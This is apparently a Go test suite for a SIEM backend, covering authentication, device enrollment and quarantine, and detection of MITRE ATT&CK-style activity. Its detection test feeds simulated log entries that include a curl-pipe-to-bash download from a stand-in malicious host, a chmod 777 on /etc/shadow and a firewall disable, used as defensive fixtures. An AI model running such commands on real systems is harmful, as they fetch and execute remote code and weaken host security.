package tests

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/sentinel/siem-backend/internal/api"
	"github.com/sentinel/siem-backend/internal/config"
	"github.com/sentinel/siem-backend/internal/database"
	"github.com/sentinel/siem-backend/internal/models"
	"github.com/sentinel/siem-backend/internal/services"
)

type TestHarness struct {
	Store    *database.Store
	AIEngine *services.AIEngine
	NetMgr   *services.NetworkManager
	Router   http.Handler
	DataDir  string
}

func setupTestHarness(t *testing.T) *TestHarness {
	t.Setenv("ADMIN_PASSWORD", "admin")
	tempDir, err := os.MkdirTemp("", "siem-sandbox-test-*")
	if err != nil {
		t.Fatalf("Failed to create temp test dir: %v", err)
	}

	cfg := &config.Config{
		Port:            "8000",
		JWTSecret:       "sandbox-test-jwt-secret-key-1234567890",
		DataDir:         tempDir,
		ServerPublicURL: "http://127.0.0.1:8000",
	}

	store, err := database.NewStore(tempDir)
	if err != nil {
		t.Fatalf("Failed to create store: %v", err)
	}

	aiEngine := services.NewAIEngine(store)
	netMgr := services.NewNetworkManager(store)
	router := api.NewRouter(cfg, store, aiEngine, netMgr)

	return &TestHarness{
		Store:    store,
		AIEngine: aiEngine,
		NetMgr:   netMgr,
		Router:   router,
		DataDir:  tempDir,
	}
}

func (h *TestHarness) Teardown() {
	_ = os.RemoveAll(h.DataDir)
}

func (h *TestHarness) Request(method, path string, body interface{}, token string) *httptest.ResponseRecorder {
	var bodyReader io.Reader
	if body != nil {
		switch v := body.(type) {
		case string:
			bodyReader = strings.NewReader(v)
		case url.Values:
			bodyReader = strings.NewReader(v.Encode())
		default:
			b, _ := json.Marshal(body)
			bodyReader = bytes.NewReader(b)
		}
	}

	req := httptest.NewRequest(method, path, bodyReader)
	if body != nil {
		if _, ok := body.(url.Values); ok {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			req.Header.Set("Content-Type", "application/json")
		}
	}

	if token != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	}

	w := httptest.NewRecorder()
	h.Router.ServeHTTP(w, req)
	return w
}

func TestHealthCheck(t *testing.T) {
	h := setupTestHarness(t)
	defer h.Teardown()

	w := h.Request("GET", "/health", nil, "")
	if w.Code != http.StatusOK {
		t.Fatalf("Expected 200, got %d", w.Code)
	}

	var res map[string]string
	_ = json.NewDecoder(w.Body).Decode(&res)
	if res["status"] != "ok" || res["engine"] != "golang-enterprise-siem" {
		t.Fatalf("Unexpected health response: %v", res)
	}
}

func TestAuthFlows(t *testing.T) {
	h := setupTestHarness(t)
	defer h.Teardown()

	// 1. Admin Login (JSON)
	loginBody := map[string]string{"username": "admin", "password": "admin"}
	w := h.Request("POST", "/api/v1/auth/login", loginBody, "")
	if w.Code != http.StatusOK {
		t.Fatalf("Admin login failed: %d body: %s", w.Code, w.Body.String())
	}
	var tokenRes models.TokenResponse
	_ = json.NewDecoder(w.Body).Decode(&tokenRes)
	adminToken := tokenRes.AccessToken
	if adminToken == "" {
		t.Fatal("Admin token is empty")
	}

	// 2. /api/v1/auth/me
	w = h.Request("GET", "/api/v1/auth/me", nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Auth me failed: %d", w.Code)
	}
	var meRes models.UserResponse
	_ = json.NewDecoder(w.Body).Decode(&meRes)
	if meRes.Username != "admin" || meRes.Role != "admin" {
		t.Fatalf("Unexpected me response: %+v", meRes)
	}

	// 3. User Registration (Operator Analyst)
	regReq := models.RegisterRequest{
		Username: "analyst_sarah",
		Password: "password123",
		Role:     "analyst",
	}
	w = h.Request("POST", "/api/v1/auth/register", regReq, "")
	if w.Code != http.StatusCreated {
		t.Fatalf("Registration failed: %d body: %s", w.Code, w.Body.String())
	}
	var analystTokenRes models.TokenResponse
	_ = json.NewDecoder(w.Body).Decode(&analystTokenRes)
	if analystTokenRes.AccessToken == "" {
		t.Fatal("Analyst token is empty")
	}

	// 4. Duplicate Registration Guard
	w = h.Request("POST", "/api/v1/auth/register", regReq, "")
	if w.Code != http.StatusBadRequest {
		t.Fatalf("Expected 400 for duplicate registration, got %d", w.Code)
	}

	// 5. Change Password
	pwReq := models.ChangePasswordRequest{
		CurrentPassword: "password123",
		NewPassword:     "newSecretPassword456",
	}
	w = h.Request("POST", "/api/v1/auth/change-password", pwReq, analystTokenRes.AccessToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Change password failed: %d body: %s", w.Code, w.Body.String())
	}

	// 6. Login with new password
	w = h.Request("POST", "/api/v1/auth/login", map[string]string{
		"username": "analyst_sarah",
		"password": "newSecretPassword456",
	}, "")
	if w.Code != http.StatusOK {
		t.Fatalf("Login with updated password failed: %d", w.Code)
	}
}

func TestEnrollmentAndDeviceQuarantine(t *testing.T) {
	h := setupTestHarness(t)
	defer h.Teardown()

	// Admin login
	w := h.Request("POST", "/api/v1/auth/login", map[string]string{"username": "admin", "password": "admin"}, "")
	var tokRes models.TokenResponse
	_ = json.NewDecoder(w.Body).Decode(&tokRes)
	adminToken := tokRes.AccessToken

	// 1. Generate Enrollment Token
	w = h.Request("POST", "/api/v1/enrollment/token?reusable=true&days_valid=30", nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Generate token failed: %d body: %s", w.Code, w.Body.String())
	}
	var tokenGenRes map[string]interface{}
	_ = json.NewDecoder(w.Body).Decode(&tokenGenRes)
	enrollmentToken := tokenGenRes["token"].(string)

	// 2. Register Device via Token
	regBody := models.DeviceRegistrationRequest{
		Token:        enrollmentToken,
		Hostname:     "finance-workstation-01",
		IPAddress:    "192.168.1.150",
		MACAddress:   "00:11:22:33:44:55",
		OS:           "linux",
		OSVersion:    "Ubuntu 24.04 LTS",
		AgentVersion: "2.0.0-go-native",
	}
	w = h.Request("POST", "/api/v1/enrollment/register", regBody, "")
	if w.Code != http.StatusOK {
		t.Fatalf("Device registration failed: %d body: %s", w.Code, w.Body.String())
	}
	var devRegRes models.DeviceRegistrationResponse
	_ = json.NewDecoder(w.Body).Decode(&devRegRes)
	deviceID := devRegRes.DeviceID
	deviceToken := devRegRes.DeviceCredential

	// 3. Heartbeat from Agent
	hbBody := models.HeartbeatRequest{
		DeviceID:  deviceID,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Status:    "online",
	}
	w = h.Request("POST", "/api/v1/agent/heartbeat", hbBody, deviceToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Heartbeat failed: %d body: %s", w.Code, w.Body.String())
	}

	// 4. Send Metrics from Agent
	metricBody := models.MetricsBatchRequest{
		DeviceID: deviceID,
		Metrics: []models.MetricItem{
			{
				Timestamp:      time.Now().UTC().Format(time.RFC3339),
				CPUPercent:     15.0,
				MemoryPercent:  45.0,
				DiskPercent:    50.0,
				NetworkRXBytes: 2000,
				NetworkTXBytes: 3000,
			},
		},
	}
	w = h.Request("POST", "/api/v1/agent/metrics", metricBody, deviceToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Metrics send failed: %d body: %s", w.Code, w.Body.String())
	}

	// 5. Isolate Device from SOC Admin
	w = h.Request("POST", fmt.Sprintf("/api/v1/devices/%s/isolate", deviceID), nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Device isolate failed: %d body: %s", w.Code, w.Body.String())
	}

	// 6. QUARANTINE ENFORCEMENT CHECK: Heartbeat and Telemetry MUST be rejected with HTTP 403 Forbidden!
	w = h.Request("POST", "/api/v1/agent/heartbeat", hbBody, deviceToken)
	if w.Code != http.StatusForbidden {
		t.Fatalf("Expected HTTP 403 Forbidden for quarantined device heartbeat, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "Device is isolated") {
		t.Fatalf("Expected quarantine detail message, got: %s", w.Body.String())
	}

	// Metrics must also be rejected with 403 Forbidden!
	w = h.Request("POST", "/api/v1/agent/metrics", metricBody, deviceToken)
	if w.Code != http.StatusForbidden {
		t.Fatalf("Expected HTTP 403 Forbidden for quarantined device metrics, got %d", w.Code)
	}

	// 7. Restore Device from Quarantine
	w = h.Request("POST", fmt.Sprintf("/api/v1/devices/%s/restore", deviceID), nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Device restore failed: %d body: %s", w.Code, w.Body.String())
	}

	// 8. Verify Telemetry Works Again After Restoration
	w = h.Request("POST", "/api/v1/agent/heartbeat", hbBody, deviceToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Expected 200 OK after device restoration, got %d", w.Code)
	}
}

func TestMITREAIThreatDetectionVectors(t *testing.T) {
	h := setupTestHarness(t)
	defer h.Teardown()

	// Admin login
	w := h.Request("POST", "/api/v1/auth/login", map[string]string{"username": "admin", "password": "admin"}, "")
	var tokRes models.TokenResponse
	_ = json.NewDecoder(w.Body).Decode(&tokRes)
	adminToken := tokRes.AccessToken

	// Register test endpoint
	w = h.Request("POST", "/api/v1/enrollment/token", nil, adminToken)
	var tokenGenRes map[string]interface{}
	_ = json.NewDecoder(w.Body).Decode(&tokenGenRes)
	enrollmentToken := tokenGenRes["token"].(string)

	w = h.Request("POST", "/api/v1/enrollment/register", models.DeviceRegistrationRequest{
		Token:        enrollmentToken,
		Hostname:     "threat-lab-target",
		IPAddress:    "10.0.0.99",
		MACAddress:   "aa:bb:cc:dd:ee:ff",
		OS:           "linux",
		OSVersion:    "Debian 12",
		AgentVersion: "2.0.0-go-native",
	}, "")
	var devRegRes models.DeviceRegistrationResponse
	_ = json.NewDecoder(w.Body).Decode(&devRegRes)
	deviceID := devRegRes.DeviceID
	deviceToken := devRegRes.DeviceCredential

	// Vector 1: MITRE T1110 - Brute Force Authentication Burst (3 failures in 90s)
	failedLogs := models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "sshd",
				Severity:  "warning",
				Message:   "Failed password for invalid user root from 192.168.1.200 port 44212 ssh2",
			},
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "sshd",
				Severity:  "warning",
				Message:   "Failed password for invalid user admin from 192.168.1.200 port 44214 ssh2",
			},
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "sshd",
				Severity:  "warning",
				Message:   "Failed password for user ubuntu from 192.168.1.200 port 44216 ssh2",
			},
		},
	}
	w = h.Request("POST", "/api/v1/agent/logs", failedLogs, deviceToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Log ingestion failed: %d", w.Code)
	}

	// Vector 2: MITRE T1548 - Privilege Escalation
	privLogs := models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "sudo",
				Severity:  "critical",
				Message:   "sudo: chmod 777 /etc/shadow executed by hacker",
			},
		},
	}
	h.Request("POST", "/api/v1/agent/logs", privLogs, deviceToken)

	// Vector 3: MITRE T1059 - Reverse Shell Payload
	shellLogs := models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "bash",
				Severity:  "critical",
				Message:   "curl http://malicious.host/exploit.sh | bash",
			},
		},
	}
	h.Request("POST", "/api/v1/agent/logs", shellLogs, deviceToken)

	// Vector 4: MITRE T1562 - Defense Impairment
	impairLogs := models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "systemd",
				Severity:  "high",
				Message:   "ufw disable executed",
			},
		},
	}
	h.Request("POST", "/api/v1/agent/logs", impairLogs, deviceToken)

	// Vector 5: MITRE T1496 - Cryptomining Process & Sustained High CPU
	for i := 0; i < 4; i++ {
		h.Request("POST", "/api/v1/agent/metrics", models.MetricsBatchRequest{
			DeviceID: deviceID,
			Metrics: []models.MetricItem{
				{
					Timestamp:     time.Now().UTC().Format(time.RFC3339),
					CPUPercent:    96.5,
					MemoryPercent: 70.0,
				},
			},
		}, deviceToken)
	}

	// Vector 6: MITRE T1048 - Exfiltration Burst (>50MB delta)
	h.Request("POST", "/api/v1/agent/metrics", models.MetricsBatchRequest{
		DeviceID: deviceID,
		Metrics: []models.MetricItem{
			{
				Timestamp:      time.Now().UTC().Format(time.RFC3339),
				NetworkTXBytes: 65 * 1024 * 1024, // 65 MB spike
			},
		},
	}, deviceToken)

	// Vector 7: MITRE T1046 - Network Scanner Process
	h.Request("POST", "/api/v1/agent/processes", models.ProcessesRequest{
		DeviceID: deviceID,
		Processes: []models.Process{
			{
				PID:        31337,
				Name:       "nmap",
				Executable: "/usr/bin/nmap",
				CPUPercent: 12.0,
			},
		},
	}, deviceToken)

	// Verify All Anomalies Registered
	w = h.Request("GET", "/api/v1/anomalies", nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("List anomalies failed: %d", w.Code)
	}
	var anomRes map[string]interface{}
	_ = json.NewDecoder(w.Body).Decode(&anomRes)
	anomalies := anomRes["anomalies"].([]interface{})

	if len(anomalies) < 5 {
		t.Fatalf("Expected at least 5 AI anomalies detected across MITRE vectors, got %d", len(anomalies))
	}

	// Verify AI Posture and Risk Score
	w = h.Request("GET", "/api/v1/anomalies/stats", nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Anomaly stats failed: %d", w.Code)
	}
	var statsRes map[string]interface{}
	_ = json.NewDecoder(w.Body).Decode(&statsRes)

	riskScore := statsRes["risk_score"].(float64)
	posture := statsRes["posture"].(string)

	if riskScore <= 50 {
		t.Fatalf("Expected elevated risk score (>50) under active multi-vector attack, got %.1f", riskScore)
	}
	if posture != "CRITICAL" && posture != "ELEVATED" {
		t.Fatalf("Expected CRITICAL or ELEVATED posture, got %s", posture)
	}

	// Verify Resolving Anomaly
	firstAnomaly := anomalies[0].(map[string]interface{})
	anomID := firstAnomaly["_id"].(string)

	w = h.Request("POST", fmt.Sprintf("/api/v1/anomalies/%s/resolve", anomID), nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Resolve anomaly failed: %d body: %s", w.Code, w.Body.String())
	}
}

func TestCascadeDeviceDeletion(t *testing.T) {
	h := setupTestHarness(t)
	defer h.Teardown()

	// Admin login
	w := h.Request("POST", "/api/v1/auth/login", map[string]string{"username": "admin", "password": "admin"}, "")
	var tokRes models.TokenResponse
	_ = json.NewDecoder(w.Body).Decode(&tokRes)
	adminToken := tokRes.AccessToken

	// Register device
	w = h.Request("POST", "/api/v1/enrollment/token", nil, adminToken)
	var tokenGenRes map[string]interface{}
	_ = json.NewDecoder(w.Body).Decode(&tokenGenRes)
	tokenStr := tokenGenRes["token"].(string)

	w = h.Request("POST", "/api/v1/enrollment/register", models.DeviceRegistrationRequest{
		Token:        tokenStr,
		Hostname:     "deletable-node",
		IPAddress:    "10.10.10.10",
		MACAddress:   "11:22:33:44:55:66",
		OS:           "linux",
		OSVersion:    "CentOS 9",
		AgentVersion: "2.0.0-go-native",
	}, "")
	var devRegRes models.DeviceRegistrationResponse
	_ = json.NewDecoder(w.Body).Decode(&devRegRes)
	deviceID := devRegRes.DeviceID
	devToken := devRegRes.DeviceCredential

	// Send logs and metrics
	h.Request("POST", "/api/v1/agent/logs", models.LogsBatchRequest{
		DeviceID: deviceID,
		Logs: []models.LogItem{
			{
				Timestamp: time.Now().UTC().Format(time.RFC3339),
				Source:    "kernel",
				Severity:  "warning",
				Message:   "Temporary test log",
			},
		},
	}, devToken)

	h.Request("POST", "/api/v1/agent/metrics", models.MetricsBatchRequest{
		DeviceID: deviceID,
		Metrics: []models.MetricItem{
			{
				Timestamp:  time.Now().UTC().Format(time.RFC3339),
				CPUPercent: 10.0,
			},
		},
	}, devToken)

	// Perform Permanent Deletion (Admin only)
	w = h.Request("DELETE", fmt.Sprintf("/api/v1/devices/%s", deviceID), nil, adminToken)
	if w.Code != http.StatusOK {
		t.Fatalf("Delete device failed: %d body: %s", w.Code, w.Body.String())
	}

	// Verify Device Not Found
	w = h.Request("GET", fmt.Sprintf("/api/v1/devices/%s", deviceID), nil, adminToken)
	if w.Code != http.StatusNotFound {
		t.Fatalf("Expected 404 Not Found after device deletion, got %d", w.Code)
	}

	// Verify Cascade: No Logs Exist for this Device
	w = h.Request("GET", fmt.Sprintf("/api/v1/logs?device_id=%s", deviceID), nil, adminToken)
	var logRes map[string]interface{}
	_ = json.NewDecoder(w.Body).Decode(&logRes)
	totalLogs := logRes["total"].(float64)
	if totalLogs != 0 {
		t.Fatalf("Expected 0 logs after cascade deletion, got %.0f", totalLogs)
	}
}
